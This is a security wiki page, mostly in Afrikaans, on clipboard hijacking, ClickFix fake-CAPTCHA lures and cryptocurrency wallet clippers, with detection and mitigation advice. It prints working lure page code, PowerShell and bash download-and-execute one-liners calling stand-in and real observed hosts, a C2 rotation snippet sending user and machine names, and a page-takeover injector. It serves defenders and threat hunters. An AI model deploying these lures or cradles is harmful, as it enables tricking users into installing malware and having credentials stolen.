# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Never paste anything you did not copy yourself." – ou, maar steeds geldige raad

## Oorsig

Clipboard hijacking – ook bekend as *pastejacking* – misbruik die feit dat gebruikers gereeld copy-and-paste-opdragte sonder inspeksie gebruik. ’n Kwaadwillige webblad (of enige JavaScript-vermoënde konteks soos ’n Electron- of Desktop-toepassing) plaas programmaties teks wat deur die aanvaller beheer word in die stelsel clipboard. Slagoffers word aangemoedig, gewoonlik deur sorgvuldig saamgestelde social-engineering-instruksies, om **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell) te druk, of ’n terminal oop te maak en die clipboard-inhoud te *paste*, wat dadelik arbitrêre opdragte uitvoer.

Omdat **geen lêer afgelaai word en geen attachment oopgemaak word nie**, omseil die tegniek die meeste e-pos- en webinhoud-sekuriteitskontroles wat attachments, macros of direkte opdraguitvoering monitor. Die aanval is daarom gewild in phishing-veldtogte wat commodity malware families soos NetSupport RAT, Latrodectus loader of Lumma Stealer lewer.

## Wallet-adres vervangings clippers

Nog ’n **clipboard hijacking**-variant paste glad nie opdragte nie: dit wag totdat die slagoffer ’n **cryptocurrency wallet address** kopieer, en vervang dit dan stilweg met ’n aanvaller-beheerde een net voor paste. Dit is veral doeltreffend teen lang wallet-formate omdat gebruikers dikwels net die eerste/laaste karakters verifieer.

Algemene werklike eienskappe:
- **Thin loader + nested payload**: die sigbare app/exe lyk soos ’n legitieme trading- of "profit"-instrument, terwyl die werklike clipper dieper in die bundle versteek is (byvoorbeeld ’n .NET loader wat ’n nested Rust payload lanseer).
- **Regex-driven replacement**: die malware pas stringe soos `bc1...`, `1...`, `3...`, `0x...`, `addr1...`, `DdzFF...`, `ltc...`, `T...`, `r...`, of selfs generiese **44-karakter Solana-agtige** stringe, en skryf dit na aanvaller-wallets oor.
- **Wallet rotation at scale**: moderne Windows-samples kan **duisende** vervangings-wallets per currency insluit in plaas van ’n enkele statiese adres, wat wallet reputation burn ná elke diefstal verminder.

### Windows clipper flow

’n Algemene implementering is ’n versteekte venster wat met **`AddClipboardFormatListener`** geregistreer is. Met elke clipboard-opdatering roep die malware tipies:
- **`OpenClipboard`** → kry toegang tot huidige clipboard-data.
- **`GetClipboardData`** → lees teks.
- **`EmptyClipboard`** + **`SetClipboardData`** → vervang die wallet-string met die aanvallerwaarde.

Minimum hunting regexes wat dikwels in clippers gesien word:
```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```
Gebruiker-vlak volharding is genoeg vir impak. Een waargenome patroon is:
- Kopieer payload na **`%APPDATA%\silke\silke.exe`**
- Skep 'n **Startup-folder LNK** onder `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\`

Opsporingsidees:
- Prosesse wat clipboard APIs voortdurend aanroep terwyl hulle ook onder `%APPDATA%` en die gebruiker se **Startup**-folder skryf.
- Nuwe LNK/executable-skepping gevolg deur wallet-address clipboard-herschrywings.
- Archives of vals-sagteware bundels wat baie ongebruikte files plus 'n klein launcher bevat wat 'n geneste binary begin.

### macOS sosiaal-geëngeneerde quarantine-verwydering + LaunchAgent-volharding

Op macOS stuur sommige campaigns 'n **`unlocker.command`** helper en instrueer die slagoffer om regs te klik → **Open** as Gatekeeper sê die app is beskadig of van 'n onbekende ontwikkelaar kom. Die script verwyder eenvoudig quarantine en begin die nabygeleë `.app`:
```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```
Dit is **nie** ’n Gatekeeper-exploit nie; dit is ’n **sosiaal-ingenieerde quarantine-omseiling** wat die feit misbruik dat Gatekeeper-besluite afhang van die `com.apple.quarantine` xattr.

Na uitvoering kan die clipper as die huidige gebruiker voortbestaan deur te skryf:
- **`~/launch.sh`** – wrapper script
- **`~/Library/LaunchAgents/com.example..plist`** – LaunchAgent met `RunAtLoad` en `KeepAlive`

’n Nuttige verdedigende detail is dat sommige samples ’n **self-healing watchdog** implementeer wat die LaunchAgent en wrapper elke ~30 sekondes weer skryf. As jy die plist eerste verwyder **sonder om die lopende proses te kill**, kan die malware dit onmiddellik herskep. Veilige cleanup-volgorde:
1. Kill die aktiewe clipper-proses.
2. Unload/delete die LaunchAgent plist.
3. Delete `~/launch.sh` en die gekopieerde payload.

### Delivery note: fake reputation as a force multiplier

Vir hierdie familie kan die malware self tegnies eenvoudig bly terwyl die **distribution layer** die swaar werk doen: fake GitHub stars/forks, SourceForge reviews/downloads, YouTube tutorial comments/views, en onskadelik-lykende VirusTotal comments/votes word gebruik om die binary betroubaar te laat lyk voor uitvoering.

## Forced copy buttons and hidden payloads (macOS one-liners)

Sommige macOS infostealers kloon installer sites (bv. Homebrew) en **dwing die gebruik van ’n “Copy” button** af sodat gebruikers nie net die sigbare teks kan highlight nie. Die clipboard entry bevat die verwagte installer command plus ’n aangehegte Base64 payload (bv. `...; echo <b64> | base64 -d | sh`), so ’n enkele paste voer albei uit terwyl die UI die ekstra stage verberg.

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Ouerer veldtogte het `document.execCommand('copy')` gebruik, nuwes maak staat op die asinchrone **Clipboard API** (`navigator.clipboard.writeText`).

## The ClickFix / ClearFake Flow

1. Gebruiker besoek 'n typosquatted of gekompromitteerde site (bv. `docusign.sa[.]com`)
2. Ingevoegde **ClearFake** JavaScript roep 'n `unsecuredCopyToClipboard()` helper aan wat stilweg 'n Base64-gekodeerde PowerShell eenreël in die clipboard stoor.
3. HTML-instruksies sê vir die slagoffer om: *“Press **Win + R**, paste the command and press Enter to resolve the issue.”*
4. `powershell.exe` voer uit, laai 'n argief af wat 'n wettige uitvoerbare lêer plus 'n kwaadwillige DLL bevat (klassieke DLL sideloading).
5. Die loader ontsyfer bykomende stadiums, inject shellcode en installeer persistence (bv. scheduled task) – uiteindelik loop dit NetSupport RAT / Latrodectus / Lumma Stealer.

### Example NetSupport RAT Chain
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (legitimate Java WebStart) soek sy gids vir `msvcp140.dll`.
* Die kwaadwillige DLL los APIs dinamies op met **GetProcAddress**, laai twee binaries af (`data_3.bin`, `data_4.bin`) via **curl.exe**, dekripteer hulle met `n rolling XOR-sleutel `"https://google.com/"`, spuit die finale shellcode in en unzip **client32.exe** (NetSupport RAT) na `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Laai `la.txt` af met **curl.exe**
2. Voer die JScript-aflaaier binne **cscript.exe** uit
3. Haal ’n MSI-payload op → laat val `libcef.dll` langs ’n ondertekende toepassing → DLL-sideloading → shellcode → Latrodectus.

### Lumma Stealer via MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
Die **mshta**-oproep begin 'n versteekte PowerShell-skrip wat `PartyContinued.exe` ophaal, `Boat.pst` (CAB) uittrek, `AutoIt3.exe` herbou deur `extrac32` & lêer-konkatenasie en uiteindelik 'n `.a3x`-skrip laat loop wat blaaiersbewyse na `sumeriavgv.digital` eksfiltreer.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

Sommige ClickFix-veldtogte slaan lêer-aflaaie heeltemal oor en gee slagoffers opdrag om 'n eenlyn te plak wat JavaScript via WSH haal en uitvoer, dit laat voortbestaan, en C2 daagliks roteer. Voorbeeld waargeneemde ketting:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Sleutelkenmerke
- Obfuscated URL word tydens runtime omgekeer om toevallige inspeksie te foelie.
- JavaScript volhard self via 'n Startup LNK (WScript/CScript), en kies die C2 volgens die huidige dag – wat vinnige domeinrotasie moontlik maak.

Minimale JS-fragment wat gebruik word om C2s volgens datum te roteer:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
Volgende stadium ontplooi gewoonlik ’n loader wat persistence vestig en ’n RAT haal (bv. PureHVNC), dikwels met TLS gepin aan ’n hardcoded sertifikaat en verkeer in stukke verdeel.

Detection ideas specific to this variant
- Process tree: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (of `cscript.exe`).
- Startup artefacts: LNK in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` wat WScript/CScript aanroep met ’n JS pad onder `%TEMP%`/`%APPDATA%`.
- Registry/RunMRU and command-line telemetry wat `.split('').reverse().join('')` of `eval(a.responseText)` bevat.
- Herhaalde `powershell -NoProfile -NonInteractive -Command -` met groot stdin payloads om lang scripts te voer sonder lang command lines.
- Scheduled Tasks wat daarna LOLBins soos `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` uitvoer onder ’n updater-agtige task/pad (bv. `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Daagliks roterende C2 hostnames en URLs met `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>` patroon.
- Korrelleer clipboard write events gevolg deur Win+R paste en dan onmiddellik `powershell.exe` uitvoering.


Blue-teams kan clipboard-, process-creation- en registry-telemetrie kombineer om pastejacking-misbruik vas te pen:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` hou ’n geskiedenis van **Win + R** commands – soek vir ongewone Base64 / obfuscated entries.
* Security Event ID **4688** (Process Creation) waar `ParentImage` == `explorer.exe` en `NewProcessName` in { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** vir file creations onder `%LocalAppData%\Microsoft\Windows\WinX\` of temporary folders net voor die verdagte 4688 event.
* EDR clipboard sensors (indien teenwoordig) – korrelleer `Clipboard Write` onmiddellik gevolg deur ’n nuwe PowerShell process.

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

Onlangse campaigns produseer massaal fake CDN/browser verification pages ("Just a moment…", IUAM-style) wat users dwing om OS-spesifieke commands van hul clipboard in native consoles te copy. Dit pivot execution uit die browser sandbox en werk oor Windows en macOS.

Key traits of the builder-generated pages
- OS detection via `navigator.userAgent` om payloads aan te pas (Windows PowerShell/CMD vs. macOS Terminal). Optional decoys/no-ops vir unsupported OS om die illusie te behou.
- Automatic clipboard-copy op onskadelike UI actions (checkbox/Copy) terwyl die sigbare text kan verskil van die clipboard content.
- Mobile blocking en ’n popover met stap-vir-stap instructions: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
- Optional obfuscation en single-file injector om ’n compromised site se DOM te overwrite met ’n Tailwind-styled verification UI (geen nuwe domain registration required nie).

Example: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS-volharding van die aanvanklike uitvoering
- Gebruik `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` sodat uitvoering voortgaan nadat die terminaal sluit, wat sigbare artefakte verminder.

In-place bladsy-oorname op gekompromitteerde webwerwe
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Detection & hunting ideas specific to IUAM-style lures
- Web: Pages that bind Clipboard API to verification widgets; mismatch between displayed text and clipboard payload; `navigator.userAgent` branching; Tailwind + single-page replace in suspicious contexts.
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` shortly after a browser interaction; batch/MSI installers executed from `%TEMP%`.
- macOS endpoint: Terminal/iTerm spawning `bash`/`curl`/`base64 -d` with `nohup` near browser events; background jobs surviving terminal close.
- Correlate `RunMRU` Win+R history and clipboard writes with subsequent console process creation.

Sien ook vir ondersteunende tegnieke

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026 fake CAPTCHA / ClickFix evolutions (ClearFake, Scarlet Goldfinch)

- ClearFake continues to compromise WordPress sites and inject loader JavaScript that chains external hosts (Cloudflare Workers, GitHub/jsDelivr) and even blockchain “etherhiding” calls (e.g., POSTs to Binance Smart Chain API endpoints such as `bsc-testnet.drpc[.]org`) to pull current lure logic. Recent overlays heavily use fake CAPTCHAs that instruct users to copy/paste a one-liner (T1204.004) instead of downloading anything.
- Initial execution is increasingly delegated to signed script hosts/LOLBAS. January 2026 chains swapped earlier `mshta` usage for the built-in `SyncAppvPublishingServer.vbs` executed via `WScript.exe`, passing PowerShell-like arguments with aliases/wildcards to fetch remote content:
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs` is onderteken en word normaalweg deur App-V gebruik; saam met `WScript.exe` en ongewone argumente (`gal`/`gcm` aliases, wildcarded cmdlets, jsDelivr URLs) word dit ’n hoë-sein LOLBAS-fase vir ClearFake.
- Februarie 2026 fake CAPTCHA-ladings het teruggeskuif na suiwer PowerShell download cradles. Twee lewende voorbeelde:
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- Eerste chain is ’n in-memory `iex(irm ...)` grabber; die tweede stage via `WinHttp.WinHttpRequest.5.1`, skryf ’n temp `.ps1`, en begin dan met `-ep bypass` in ’n hidden window.

Detection/hunting tips for these variants
- Process lineage: browser → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` or PowerShell cradles immediately after clipboard writes/Win+R.
- Command-line keywords: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, jsDelivr/GitHub/Cloudflare Worker domains, or raw IP `iex(irm ...)` patterns.
- Network: outbound to CDN worker hosts or blockchain RPC endpoints from script hosts/PowerShell shortly after web browsing.
- File/registry: temporary `.ps1` creation under `%TEMP%` plus RunMRU entries containing these one-liners; block/alert on signed-script LOLBAS (WScript/cscript/mshta) executing with external URLs or obfuscated alias strings.

## June 2026 ClickFix tradecraft: paste telemetry, fake verification comments, and LOLBin chaining

Recent Red Canary telemetry shows that the stable indicator is **not one exact command**, but the combination of **user-assisted paste-and-run**, **trusted interpreters/LOLBins**, **obfuscated flags**, **remote retrieval**, and **immediate execution**.

### Notable operator patterns

- **Paste confirmation telemetry**: some payloads call `curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST ... /api/metrics/run?event=pasted` before the real stage. This confirms user interaction while keeping the window short and quiet.
- **Fake verification comments**: PowerShell one-liners may append strings such as `# Security check ✔️ I'm not a robot Verification ID: 138105` so the command still looks CAPTCHA-related after it is pasted into Run / `cmd.exe` / PowerShell history.
- **Dynamic URL reconstruction**: `iex(irm(('ccud'+'mcx')+('.x'+'yz/u')))` avoids a static URL in the command line while still performing in-memory download-and-execute.
- **Masqueraded installer execution**: `"C:\WINDOWS\system32\msIeXec.exe" -PAcKᵃGE http://... /Q` abuses unusual casing and Unicode-like characters in flags to break brittle detections while still resembling `msiexec.exe`.
- **Caret-escaped LOLBin chains**: `cmd.exe` can hide keywords with `^` escapes (`s^t^a^r^t`, `^c^u^r^l^`, `^m^s^h^t^a^`), start the nested shell minimized, save attacker content with a benign extension such as `.pdf`, and then execute it through `mshta`.
## Mitigations

1. Browser hardening – disable clipboard write-access (`dom.events.asyncClipboard.clipboardItem` etc.) or require user gesture.
2. Security awareness – teach users to *type* sensitive commands or paste them into a text editor first.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control to block arbitrary one-liners.
4. Network controls – block outbound requests to known pastejacking and malware C2 domains.

## Related Tricks

* **Discord Invite Hijacking** often abuses the same ClickFix approach after luring users into a malicious server:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [Red Canary – Intelligence Insights: February 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [Red Canary – Intelligence Insights: June 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-june-2026/)
- [Check Point Research – From Stars to Upvotes: Fake Reputation Fueling a Crypto Clipboard Hijacker](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)

{{#include ../../banners/hacktricks-training.md}}
